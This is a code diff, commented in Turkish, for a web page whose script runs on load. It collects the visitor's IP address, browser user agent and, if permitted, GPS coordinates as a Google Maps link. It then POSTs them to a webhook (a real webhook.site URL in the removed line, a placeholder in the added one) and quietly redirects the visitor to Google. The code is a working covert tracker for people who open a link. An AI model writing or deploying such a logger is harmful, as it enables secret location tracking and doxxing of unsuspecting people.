@@ -5,25 +5,46 @@
 </head>
 <body>
     <script>
-        // Buradaki URL'yi 3. Adımda değiştireceğiz
-        const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
+        const webhookURL = "SENIN_WEBHOOK_URLN_BURAYA";
 
+        // Önce IP'yi alalım
         fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ip = data.ip;
-            const userAgent = navigator.userAgent;
+        .then(res => res.json())
+        .then(ipData => {
+            let dataToSend = {
+                ip: ipData.ip,
+                cihaz: navigator.userAgent,
+                konum: "İzin Verilmedi"
+            };
 
+            // Şimdi GPS konumu isteyelim
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    // Kullanıcı izin verirse burası çalışır
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    dataToSend.konum = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    gonder(dataToSend);
+                }, () => {
+                    // İzin verilmezse sadece IP ile gönder
+                    gonder(dataToSend);
+                });
+            } else {
+                gonder(dataToSend);
+            }
+        });
+
+        function gonder(data) {
             fetch(webhookURL, {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ ip: ip, cihaz: userAgent })
+                body: JSON.stringify(data)
             }).then(() => {
-                // Bilgiyi gönderdikten sonra kullanıcıyı başka yere yönlendir
+                // Her durumda Google'a yönlendir
                 window.location.href = "https://www.google.com";
             });
-        });
+        }
     </script>
 </body>
 </html>
